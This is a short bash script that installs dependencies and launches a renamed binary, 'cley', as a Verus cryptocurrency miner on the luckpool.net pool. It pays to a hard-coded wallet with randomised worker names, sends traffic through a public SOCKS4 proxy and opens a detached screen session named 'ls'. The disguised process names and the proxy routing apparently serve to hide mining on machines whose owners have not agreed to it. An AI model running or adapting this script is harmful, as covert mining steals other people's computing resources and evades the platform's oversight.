#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cley
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=REpjC6VmRd7LwtK9xuWEZQfPvSYpBCia5s
WORKER=$(echo $(shuf -i 1-7 -n 1)-CUDA77)
PROXY=socks4://176.212.149.251:4145
./cley -a verus -o $POOL -u $WALLET.$WORKER -t 65 -x $PROXY
